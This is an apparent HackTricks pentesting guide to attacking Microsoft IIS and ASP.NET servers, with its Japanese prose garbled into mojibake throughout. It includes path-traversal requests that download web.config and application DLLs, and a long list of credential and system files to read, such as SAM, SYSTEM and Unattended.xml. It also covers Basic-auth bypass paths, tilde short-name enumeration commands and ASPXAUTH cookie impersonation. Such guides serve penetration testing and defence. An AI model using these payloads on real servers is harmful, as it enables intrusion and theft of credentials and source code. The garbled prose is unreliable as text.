# IIS - ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆæƒ…å ±ã‚µãƒ¼ãƒ“ã‚¹

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

ãƒ†ã‚¹ãƒˆå®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«æ‹¡å¼µå­ï¼š

* asp
* aspx
* config
* php

## å†…éƒ¨IPã‚¢ãƒ‰ãƒ¬ã‚¹ã®æ¼æ´©

302ã‚’å—ã‘å–ã£ãŸä»»æ„ã®IISã‚µãƒ¼ãƒãƒ¼ã§ã¯ã€Hostãƒ˜ãƒƒãƒ€ãƒ¼ã‚’å‰Šé™¤ã—ã€HTTP/1.0ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹å†…ã®Locationãƒ˜ãƒƒãƒ€ãƒ¼ãŒå†…éƒ¨IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
å†…éƒ¨IPã‚’é–‹ç¤ºã™ã‚‹å¿œç­”:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## .configãƒ•ã‚¡ã‚¤ãƒ«ã®å®Ÿè¡Œ

.configãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚ã“ã‚Œã‚’è¡Œã†æ–¹æ³•ã®1ã¤ã¯ã€HTMLã‚³ãƒ¡ãƒ³ãƒˆå†…ã®ãƒ•ã‚¡ã‚¤ãƒ«ã®æœ€å¾Œã«ã‚³ãƒ¼ãƒ‰ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ã™: [ã“ã“ã‹ã‚‰ä¾‹ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®è©³ç´°æƒ…å ±ã¨æŠ€è¡“ã¯[ã“ã¡ã‚‰](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)ã§ç¢ºèªã§ãã¾ã™ã€‚

## IISãƒ‡ã‚£ã‚¹ã‚«ãƒãƒªãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

ç§ãŒä½œæˆã—ãŸãƒªã‚¹ãƒˆã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦ãã ã•ã„:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

ã“ã‚Œã¯ã€ä»¥ä¸‹ã®ãƒªã‚¹ãƒˆã®å†…å®¹ã‚’çµ±åˆã—ã¦ä½œæˆã•ã‚Œã¾ã—ãŸ:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

æ‹¡å¼µå­ã‚’è¿½åŠ ã›ãšã«ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚å¿…è¦ãªãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ã™ã§ã«æ‹¡å¼µå­ãŒã‚ã‚Šã¾ã™ã€‚

## ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«

### ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®æ¼æ´©

å®Œå…¨ãªè©³ç´°ã¯æ¬¡ã®ãƒªãƒ³ã‚¯ã§ç¢ºèªã§ãã¾ã™: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
è¦ç´„ã™ã‚‹ã¨ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ•ã‚©ãƒ«ãƒ€å†…ã«ã€Œ**assemblyIdentity**ã€ãƒ•ã‚¡ã‚¤ãƒ«ã¨ã€Œ**namespaces**ã€ã¸ã®å‚ç…§ã‚’å«ã‚€ã„ãã¤ã‹ã®web.configãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦ã€**å®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«ã®å ´æ‰€**ã‚’çŸ¥ã‚Šã€ãã‚Œã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚\
**ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸDll**ã‹ã‚‰ã¯ã€**æ–°ã—ã„namespaces**ã‚’è¦‹ã¤ã‘ã¦ã‚¢ã‚¯ã‚»ã‚¹ã—ã€web.configãƒ•ã‚¡ã‚¤ãƒ«ã‚’å–å¾—ã—ã¦æ–°ã—ã„namespacesã¨assemblyIdentityã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚\
ã¾ãŸã€**connectionstrings.config**ãŠã‚ˆã³**global.asax**ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯èˆˆå‘³æ·±ã„æƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\\
{% endhint %}

**.Net MVCã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³**ã§ã¯ã€**web.config**ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒä¾å­˜ã™ã‚‹å„ãƒã‚¤ãƒŠãƒªãƒ•ã‚¡ã‚¤ãƒ«ã‚’**"assemblyIdentity"** XMLã‚¿ã‚°ã‚’é€šã˜ã¦æŒ‡å®šã™ã‚‹é‡è¦ãªå½¹å‰²ã‚’æœãŸã—ã¾ã™ã€‚

### **ãƒã‚¤ãƒŠãƒªãƒ•ã‚¡ã‚¤ãƒ«ã®æ¢ç´¢**

**web.config**ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ä¾‹ã¯ä»¥ä¸‹ã«ç¤ºã•ã‚Œã¦ã„ã¾ã™:
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
ã“ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€æ¬¡ã®ã‚ˆã†ãªã•ã¾ã–ã¾ãªè¨­å®šã‚„ä¾å­˜é–¢ä¿‚ã‚’æ˜ã‚‰ã‹ã«ã—ã¾ã™ã€‚

* **EntityFramework** ãƒãƒ¼ã‚¸ãƒ§ãƒ³
* ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆæ¤œè¨¼ã€ãŠã‚ˆã³ JavaScript ã®ãŸã‚ã® **AppSettings**
* èªè¨¼ã¨ãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã®ãŸã‚ã® **System.web** è¨­å®š
* **System.webServer** ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«è¨­å®š
* **Microsoft.Owin**ã€**Newtonsoft.Json**ã€ãŠã‚ˆã³ **System.Web.Mvc** ãªã©ã®å¤šæ•°ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ãŸã‚ã® **Runtime** ã‚¢ã‚»ãƒ³ãƒ–ãƒªãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚°

ã“ã‚Œã‚‰ã®è¨­å®šã¯ã€**/bin/WebGrease.dll** ã®ã‚ˆã†ãªç‰¹å®šã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã® /bin ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼å†…ã«å­˜åœ¨ã™ã‚‹ã“ã¨ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

### **ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒ•ã‚¡ã‚¤ãƒ«**

**/global.asax** ã‚„ **/connectionstrings.config**ï¼ˆæ©Ÿå¯†ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å«ã‚€ï¼‰ãªã©ã€ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«è¦‹ã¤ã‹ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è¨­å®šã¨å‹•ä½œã«ä¸å¯æ¬ ã§ã™ã€‚

### **åå‰ç©ºé–“ã¨ Web.Config**

MVC ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€å„ãƒ•ã‚¡ã‚¤ãƒ«ã§ã®ç¹°ã‚Šè¿”ã—å®£è¨€ã‚’é¿ã‘ã‚‹ãŸã‚ã«ã€ç‰¹å®šã®åå‰ç©ºé–“ç”¨ã«è¿½åŠ ã® **web.config ãƒ•ã‚¡ã‚¤ãƒ«** ã‚’å®šç¾©ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€åˆ¥ã® **web.config** ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **DLLã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**

ã‚«ã‚¹ã‚¿ãƒ ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã®è¨€åŠã¯ã€/binãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«å­˜åœ¨ã™ã‚‹ã€Œ**WebApplication1**ã€ã¨ã„ã†åå‰ã®DLLã‚’ç¤ºå”†ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã«ç¶šã„ã¦ã€**WebApplication1.dll**ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã™ï¼š
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
ã“ã‚Œã¯ã€/binãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«**System.Web.Mvc.dll**ã‚„**System.Web.Optimization.dll**ãªã©ã®ä»–ã®é‡è¦ãªDLLã®å­˜åœ¨ã‚’ç¤ºå”†ã—ã¦ã„ã¾ã™ã€‚

DLLãŒ**WebApplication1.Areas.Minded**ã¨ã„ã†åå‰ç©ºé–“ã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã™ã‚‹ã‚·ãƒŠãƒªã‚ªã§ã¯ã€æ”»æ’ƒè€…ã¯**/area-name/Views/**ã®ã‚ˆã†ãªäºˆæ¸¬å¯èƒ½ãªãƒ‘ã‚¹ã«ä»–ã®web.configãƒ•ã‚¡ã‚¤ãƒ«ãŒå­˜åœ¨ã™ã‚‹ã“ã¨ã‚’æ¨æ¸¬ã™ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã“ã‚Œã‚‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ã€/binãƒ•ã‚©ãƒ«ãƒ€å†…ã®ä»–ã®DLLã¸ã®ç‰¹å®šã®æ§‹æˆã‚„å‚ç…§ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ä¾‹ãˆã°ã€**/Minded/Views/web.config**ã¸ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€åˆ¥ã®DLLã§ã‚ã‚‹**WebApplication1.AdditionalFeatures.dll**ã®å­˜åœ¨ã‚’ç¤ºã™æ§‹æˆã‚„åå‰ç©ºé–“ã‚’æ˜ã‚‰ã‹ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ä¸€èˆ¬çš„ãªãƒ•ã‚¡ã‚¤ãƒ«

[ã“ã¡ã‚‰](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)ã‹ã‚‰
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 ã‚¨ãƒ©ãƒ¼

æ¬¡ã®ã‚ˆã†ãªã‚¨ãƒ©ãƒ¼ãŒè¡¨ç¤ºã•ã‚ŒãŸå ´åˆï¼š

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

ã“ã‚Œã¯ã€ã‚µãƒ¼ãƒãƒ¼ãŒ**Hostãƒ˜ãƒƒãƒ€ãƒ¼å†…ã®æ­£ã—ã„ãƒ‰ãƒ¡ã‚¤ãƒ³åã‚’å—ä¿¡ã—ãªã‹ã£ãŸ**ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚\
ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã«ã¯ã€æä¾›ã•ã‚ŒãŸ**SSLè¨¼æ˜æ›¸**ã‚’ç¢ºèªã—ã€ãã“ã«ãƒ‰ãƒ¡ã‚¤ãƒ³/ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³åãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã‚‚ã—ãã“ã«ãªã„å ´åˆã¯ã€**VHostsã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**ã—ã¦æ­£ã—ã„ã‚‚ã®ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

## ç¢ºèªã™ã¹ãå¤ã„IISã®è„†å¼±æ€§

### Microsoft IISãƒãƒ«ãƒ€æ–‡å­—ã€Œ\~ã€è„†å¼±æ€§/æ©Ÿèƒ½ â€“ çŸ­ã„ãƒ•ã‚¡ã‚¤ãƒ«/ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼åã®æ¼æ´©

ã“ã®**æŠ€è¡“**ã‚’ä½¿ç”¨ã—ã¦ã€ç™ºè¦‹ã•ã‚ŒãŸå„ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼å†…ã®**ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã¨ãƒ•ã‚¡ã‚¤ãƒ«ã‚’åˆ—æŒ™**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆåŸºæœ¬èªè¨¼ãŒå¿…è¦ãªå ´åˆã§ã‚‚ï¼‰ã€‚\
ã“ã®æŠ€è¡“ã®ä¸»ãªåˆ¶é™ã¯ã€ã‚µãƒ¼ãƒãƒ¼ãŒè„†å¼±ãªå ´åˆã€**å„ãƒ•ã‚¡ã‚¤ãƒ«/ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã®åå‰ã®æœ€åˆã®6æ–‡å­—ã¨ãƒ•ã‚¡ã‚¤ãƒ«ã®æ‹¡å¼µå­ã®æœ€åˆã®3æ–‡å­—ã—ã‹è¦‹ã¤ã‘ã‚‰ã‚Œãªã„**ã“ã¨ã§ã™ã€‚

[https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)ã‚’ä½¿ç”¨ã—ã¦ã“ã®è„†å¼±æ€§ã‚’ãƒ†ã‚¹ãƒˆã§ãã¾ã™ï¼š`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (844).png>)

å…ƒã®ç ”ç©¶ï¼š[https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

**metasploit**ã‚‚ä½¿ç”¨ã§ãã¾ã™ï¼š`use scanner/http/iis_shortname_scanner`

### åŸºæœ¬èªè¨¼ã®ãƒã‚¤ãƒ‘ã‚¹

åŸºæœ¬èªè¨¼ï¼ˆ**IIS 7.5**ï¼‰ã‚’**ãƒã‚¤ãƒ‘ã‚¹**ã—ã‚ˆã†ã¨ã™ã‚‹å ´åˆï¼š`/admin:$i30:$INDEX_ALLOCATION/admin.php`ã¾ãŸã¯`/admin::$INDEX_ALLOCATION/admin.php`

ã“ã®**è„†å¼±æ€§**ã¨å‰ã®ã‚‚ã®ã‚’**çµ„ã¿åˆã‚ã›ã¦**æ–°ã—ã„**ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼**ã‚’è¦‹ã¤ã‘ã€èªè¨¼ã‚’**ãƒã‚¤ãƒ‘ã‚¹**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## ASP.NET Trace.AXD æœ‰åŠ¹ãªãƒ‡ãƒãƒƒã‚°

ASP.NETã«ã¯ãƒ‡ãƒãƒƒã‚°ãƒ¢ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ãã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯`trace.axd`ã¨å‘¼ã°ã‚Œã¾ã™ã€‚

ã“ã‚Œã¯ã€ä¸€å®šæœŸé–“ã«ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦è¡Œã‚ã‚ŒãŸã™ã¹ã¦ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®éå¸¸ã«è©³ç´°ãªãƒ­ã‚°ã‚’ä¿æŒã—ã¾ã™ã€‚

ã“ã®æƒ…å ±ã«ã¯ã€ãƒªãƒ¢ãƒ¼ãƒˆã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®IPã€ã‚»ãƒƒã‚·ãƒ§ãƒ³IDã€ã™ã¹ã¦ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŠã‚ˆã³ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã®ã‚¯ãƒƒã‚­ãƒ¼ã€ç‰©ç†ãƒ‘ã‚¹ã€ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰æƒ…å ±ã€ã•ã‚‰ã«ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTHã‚¯ãƒƒã‚­ãƒ¼

ASPXAUTHã¯æ¬¡ã®æƒ…å ±ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š

* **`validationKey`**ï¼ˆæ–‡å­—åˆ—ï¼‰ï¼šç½²åæ¤œè¨¼ã«ä½¿ç”¨ã™ã‚‹16é€²ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸã‚­ãƒ¼ã€‚
* **`decryptionMethod`**ï¼ˆæ–‡å­—åˆ—ï¼‰ï¼šï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¯ã€ŒAESã€ï¼‰ã€‚
* **`decryptionIV`**ï¼ˆæ–‡å­—åˆ—ï¼‰ï¼š16é€²ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸåˆæœŸåŒ–ãƒ™ã‚¯ãƒˆãƒ«ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¯ã‚¼ãƒ­ã®ãƒ™ã‚¯ãƒˆãƒ«ï¼‰ã€‚
* **`decryptionKey`**ï¼ˆæ–‡å­—åˆ—ï¼‰ï¼šå¾©å·åŒ–ã«ä½¿ç”¨ã™ã‚‹16é€²ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸã‚­ãƒ¼ã€‚

ãŸã ã—ã€ä¸€éƒ¨ã®äººã€…ã¯ã“ã‚Œã‚‰ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆå€¤**ã‚’ä½¿ç”¨ã—ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ã‚¯ãƒƒã‚­ãƒ¼ã¨ã—ã¦ä½¿ç”¨**ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ASPXAUTHã‚¯ãƒƒã‚­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹**åŒã˜ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ **ã®ã‚¦ã‚§ãƒ–ã‚’è¦‹ã¤ã‘ã€æ”»æ’ƒå¯¾è±¡ã®ã‚µãƒ¼ãƒãƒ¼ã§**ãªã‚Šã™ã¾ã—ãŸã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆ**ã§ãã‚Œã°ã€**2ã¤ç›®ã®ã‚µãƒ¼ãƒãƒ¼ã®ã‚¯ãƒƒã‚­ãƒ¼ã‚’æœ€åˆã®ã‚µãƒ¼ãƒãƒ¼ã§ä½¿ç”¨**ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãªã‚Šã™ã¾ã™ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚\
ã“ã®æ”»æ’ƒã¯ã“ã®[**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19)ã§æˆåŠŸã—ã¾ã—ãŸã€‚

